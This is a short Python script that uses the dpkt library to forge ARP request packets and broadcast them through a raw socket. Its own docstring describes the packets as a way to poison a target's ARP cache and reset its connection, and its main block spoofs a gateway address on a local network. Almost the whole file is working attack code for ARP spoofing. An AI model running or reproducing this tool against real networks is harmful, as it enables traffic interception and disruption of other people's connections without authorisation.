#!/usr/bin/python
# -*- coding: utf-8 -*-

import dpkt
import socket
import binascii


def macaddr_aton(mac_addr):
    """translate mac addr into network bits"""
    return binascii.unhexlify(mac_addr.replace(':', ''))


def build_arp_packet(src_macaddr, dst_macaddr, src_ip, dst_ip):
    """ forge arp packets used to poison and reset target connection """
    packet = dpkt.ethernet.Ethernet()
    arp = dpkt.arp.ARP()

    if not src_ip:
        raise Exception("src ip not found")

    if not dst_ip:
        raise Exception("dst ip not found")

    arp.sha = macaddr_aton(src_macaddr)             # source mac address
    arp.tha = macaddr_aton(dst_macaddr)             # destination mac address

    arp.spa = socket.inet_aton(dst_ip)              # source ip address
    arp.tpa = socket.inet_aton(src_ip)              # destination ip address
    arp.op = dpkt.arp.ARP_OP_REQUEST                # ARP Request

    packet.src = macaddr_aton(src_macaddr)
    packet.dst = macaddr_aton('ff:ff:ff:ff:ff:ff')  # broadcast address
    packet.type = dpkt.ethernet.ETH_TYPE_ARP
    packet.data = arp

    return packet


def send_arp_packet(device, src_macaddr, dst_macaddr, src_ip, dst_ip):
    """send arp request.
    """
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    s.bind((device, socket.SOCK_RAW))

    packet = build_arp_packet(src_macaddr, dst_macaddr, src_ip, dst_ip)
    s.send(str(packet))
    s.close()


if __name__ == '__main__':
    device = 'eth0'
    src_macaddr = "00:50:56:35:5b:aa"
    dst_macaddr = "00:00:00:00:00:00"
    src_ip = "192.168.53.156"
    dst_ip = "192.168.53.1"

    send_arp_packet(device, src_macaddr, dst_macaddr, src_ip, dst_ip)